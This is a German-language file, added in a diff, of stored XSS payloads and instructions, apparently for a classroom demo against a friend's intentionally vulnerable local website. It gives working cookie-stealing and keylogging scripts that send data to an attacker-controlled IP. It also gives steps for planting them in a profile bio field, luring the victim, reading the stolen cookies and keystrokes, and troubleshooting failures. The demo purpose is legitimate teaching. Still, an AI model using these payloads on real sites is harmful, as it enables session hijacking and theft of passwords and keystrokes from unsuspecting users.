@@ -1,0 +1,181 @@
+================================================================================
+XSS PAYLOADS - FÜR ANGRIFF AUF MARC'S WEBSITE
+================================================================================
+
+⚠️ NUR FÜR BILDUNGSZWECKE!
+
+Setup:
+- Deine IP (Attacker): 192.168.1.188
+- Dein Port: 9999
+- Kumpel's Website: http://192.168.1.145:5001
+
+================================================================================
+PAYLOAD 1: COOKIE-STEALER (Bio-Feld)
+================================================================================
+
+<script>fetch('http://192.168.1.188:9999/steal?c='+encodeURIComponent(document.cookie))</script>
+
+Was passiert:
+- Jeder der /users besucht → Cookie wird gestohlen
+- Du siehst in deinem Terminal: 🍪 COOKIE GESTOHLEN!
+
+================================================================================
+PAYLOAD 2: KEYLOGGER - AGGRESSIV (Bio-Feld)
+================================================================================
+
+<script>document.addEventListener('keypress',e=>fetch('http://192.168.1.188:9999/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+e.key}))</script>
+
+Was passiert:
+- Jeder der /users besucht → Keylogger wird aktiviert
+- Wenn das Opfer IRGENDWO tippt → Du siehst JEDEN Buchstaben einzeln!
+- Terminal zeigt: ⌨️ KEYLOG [12:30:50] [141.87.56.125]: h
+                  ⌨️ KEYLOG [12:30:50] [141.87.56.125]: e
+                  ⌨️ KEYLOG [12:30:51] [141.87.56.125]: l
+                  ⌨️ KEYLOG [12:30:51] [141.87.56.125]: l
+                  ⌨️ KEYLOG [12:30:51] [141.87.56.125]: o
+
+================================================================================
+PAYLOAD 3: KEYLOGGER - BATCH (Bio-Feld)
+================================================================================
+
+<script>let k='';document.addEventListener('keypress',e=>{k+=e.key;if(k.length>5){fetch('http://192.168.1.188:9999/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+k});k=''}})</script>
+
+Was passiert:
+- Sammelt 5 Zeichen und sendet dann als Block
+- Weniger Requests, aber gleiche Daten
+
+================================================================================
+PAYLOAD 4: KOMBINIERT - Cookie + Keylogger (Bio-Feld)
+================================================================================
+
+<script>fetch('http://192.168.1.188:9999/steal?c='+encodeURIComponent(document.cookie));document.addEventListener('keypress',e=>fetch('http://192.168.1.188:9999/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+e.key}))</script>
+
+Was passiert:
+- Cookie wird SOFORT gestohlen
+- UND Keylogger läuft im Hintergrund
+- Zeigt BEIDE Angriffe gleichzeitig!
+
+================================================================================
+PAYLOAD 5: IMAGE-TAG Variante (falls <script> gefiltert)
+================================================================================
+
+<img src=x onerror="fetch('http://192.168.1.188:9999/steal?c='+encodeURIComponent(document.cookie))">
+
+Robuster falls Script-Tags gefiltert werden
+
+================================================================================
+ANLEITUNG
+================================================================================
+
+SCHRITT 1: Starte deinen Server
+-------------------------------
+python attacker_server.py
+
+Server muss auf Port 9999 laufen!
+
+SCHRITT 2: Registriere dich auf Kumpel's Website
+-------------------------------------------------
+1. Öffne: http://192.168.1.145:5001/register
+2. Username: attacker (oder beliebig)
+3. Password: test123
+4. Bio-Feld (Biographie): KOPIERE EINEN PAYLOAD VON OBEN REIN!
+5. Klicke "Registrieren"
+
+SCHRITT 3: Warte auf deinen Kumpel
+-----------------------------------
+Sage zu deinem Kumpel:
+"Schau mal auf der /users Seite, wer sich alles registriert hat!"
+
+Dein Kumpel geht zu: http://192.168.1.145:5001/users
+
+SCHRITT 4: Erfolg!
+------------------
+In DEINEM Terminal erscheint:
+
+Cookie-Stealer:
+================================================================================
+[+] COOKIE GESTOHLEN!
+================================================================================
+Zeitstempel: 2025-12-07T12:30:45.123456
+IP-Adresse:  192.168.1.145
+Cookie:      session=eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6Im1hcmMifX0...
+================================================================================
+
+Keylogger:
+⌨️ KEYLOG [12:30:50] [192.168.1.145]: t
+⌨️ KEYLOG [12:30:50] [192.168.1.145]: e
+⌨️ KEYLOG [12:30:51] [192.168.1.145]: s
+⌨️ KEYLOG [12:30:51] [192.168.1.145]: t
+
+================================================================================
+DEMO VOR DEM PROF
+================================================================================
+
+SZENARIO 1: Cookie-Diebstahl
+----------------------------
+1. Zeige deinen Server (Terminal mit Cookie-Stealer läuft)
+2. Registriere User mit Cookie-Stealer Payload
+3. Dein Kumpel besucht /users
+4. Zeige dein Terminal → Cookie wurde gestohlen!
+5. Erkläre: "Mit diesem Cookie kann ich mich als der User ausgeben!"
+
+SZENARIO 2: Keylogger
+---------------------
+1. Registriere User mit Keylogger Payload
+2. Dein Kumpel besucht /users
+3. Dein Kumpel tippt irgendwas (z.B. in Browser-Adressleiste oder Search)
+4. Zeige dein Terminal → Jeder Tastendruck erscheint!
+5. Erkläre: "Alle Tastenanschläge werden gestohlen - auch Passwörter!"
+
+SZENARIO 3: Kombiniert (BESTE DEMO)
+-----------------------------------
+1. Registriere User mit KOMBINIERTEM Payload
+2. Dein Kumpel besucht /users
+3. Terminal zeigt SOFORT: Cookie gestohlen!
+4. Dein Kumpel tippt etwas
+5. Terminal zeigt auch: Keylogger-Daten!
+6. Prof sieht BEIDE Angriffe gleichzeitig!
+
+================================================================================
+TROUBLESHOOTING
+================================================================================
+
+Problem: Keine Daten kommen an
+--------------------------------
+Check 1: Server läuft?
+  lsof -i :9999
+
+Check 2: Payload richtig?
+  - Muss 192.168.1.188:9999 enthalten (DEINE IP!)
+  - NICHT 192.168.1.145 (das ist die Website-IP von deinem Kumpel)
+
+Check 3: Templates haben |safe Filter?
+  - users.html muss |safe Filter in Bio-Spalte haben!
+  - Sonst wird <script> als Text angezeigt (kein XSS möglich)
+
+Problem: Keylogger zeigt nichts
+--------------------------------
+- Dein Kumpel muss auf der Seite TIPPEN!
+- Einfach blind auf Tastatur drücken
+- Oder Browser-Suchfeld nutzen (Cmd+F / Ctrl+F)
+- Oder zur /search Seite gehen und dort suchen
+
+Problem: Cookie ist leer
+------------------------
+- Website muss HttpOnly deaktiviert haben in app.py
+- Test: In Browser Console eingeben: document.cookie
+- Sollte Session-Cookie zeigen
+
+================================================================================
+EMPFEHLUNG FÜR DEMO: PAYLOAD 4 (KOMBINIERT)
+================================================================================
+
+Kopiere diesen Payload für die beste Demo:
+
+<script>fetch('http://192.168.1.188:9999/steal?c='+encodeURIComponent(document.cookie));document.addEventListener('keypress',e=>fetch('http://192.168.1.188:9999/log_keys',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'keys='+e.key}))</script>
+
+Zeigt BEIDE Angriffe gleichzeitig!
+
+================================================================================
+VIEL ERFOLG! 🚀
+================================================================================
